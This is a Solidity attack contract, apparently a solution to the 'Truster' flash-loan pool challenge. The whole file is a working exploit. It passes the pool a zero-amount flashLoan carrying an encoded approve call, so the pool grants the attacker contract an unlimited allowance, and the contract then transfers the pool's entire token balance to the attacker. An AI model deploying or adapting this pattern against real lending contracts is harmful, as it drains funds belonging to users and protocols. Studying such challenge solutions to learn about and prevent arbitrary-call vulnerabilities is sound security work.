// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TrusterAttacker {
  using Address for address;
  
  address immutable trusterPool;
  IERC20 immutable token;
  address immutable attacker;
  
  constructor (address poolAddr, address tokenAddr, address attackerAddr) {
    trusterPool = poolAddr;
    token = IERC20(tokenAddr);
    attacker = attackerAddr;
  }
  
  function exploit() external {
    // When the pool executes the encoded function, the pool itself, not the sender, calls
    // whatever is sent. This being the case, we can make the pool approve an allowance for
    // the attacker contract (or even the attacker himself) to get the tokens after the loan
    // execution.
    trusterPool.functionCall(
      abi.encodeWithSignature(
        "flashLoan(uint256,address,address,bytes)",
        0, address(this), address(token), abi.encodeWithSignature("approve(address,uint256)", address(this), 2**256 - 1)
      )
    );
    token.transferFrom(trusterPool, attacker, token.balanceOf(trusterPool));
  }
}